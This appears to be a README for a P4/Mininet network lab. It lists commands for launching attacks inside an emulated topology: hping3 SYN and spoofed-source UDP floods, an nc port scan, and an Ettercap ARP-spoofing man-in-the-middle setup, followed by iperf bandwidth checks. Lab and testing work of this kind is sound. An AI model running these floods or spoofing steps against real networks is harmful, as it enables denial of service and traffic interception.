## New2
How to run
1. Start the topology: sudo p4run
2. How to conduct TCP SYN Attack- Process 1://
    a. mininet> xterm h3//
    b. In host 3: hping3 -c 1000 -d 120 -S -w  64 -p 21 --flood 10.0.1.1//
3. How to conduct TCP SYN Attack-Process 2://
    a. mininet> xterm h3//
    b. In host 3: python -m SimpleHTTPServer 80
    c. mininet> h1 nc -vnz -w 1 10.0.3.1 80-85 
4. How to conduct UDP Flood Attack:
    d. mininet> xterm h3
    e. In host 3: hping3 -q -n -a 10.0.1.1 -udp -s 53 --keep -p 68 --flood 10.0.1.1
5. How to conduct ARP spoofing Attack: 
Install Ettercap
    a. sudo apt-get install ettercap-graphical
    b. Type -y on instruction
    c. mininet> xterm h1 h2 h3 h3
    d. In node 1: ifconfig
    e. In node 1: arp
    f. In node 2: ifconfig
    g. In node 2: arp
    h. In node 3: tcpdump -i h3 eth0 -n host 10.0.1.1
    i. mininet> h1 ping h2
    j In node 3: ettercap-g
In Ettercap application:
    1. Options->Promisc Mode
    2. Sniff -> Unified Snipping
    3. Select h3-eth0 in the Ettercap input dialog box.
    4. Hosts -> Scan for hosts
    5. Hosts -> Hosts List
    6. Select host with IP address 10.0.1.1 and then click Add to Target 1
    7. Select host with IP address 10.0.1.2 and then click Add to Target 2
    8. Mitm -> ARP Spoofing… Select sniff remote connections only in the dialog box
    9. Now the ARP Spoofing started. Check in h1 node and h2 node: arp -a
How to check bandwidth:
*** Starting CLI:
mininet> iperf h1 h2
From h2 you are not able:
mininet> iperf h2 h1
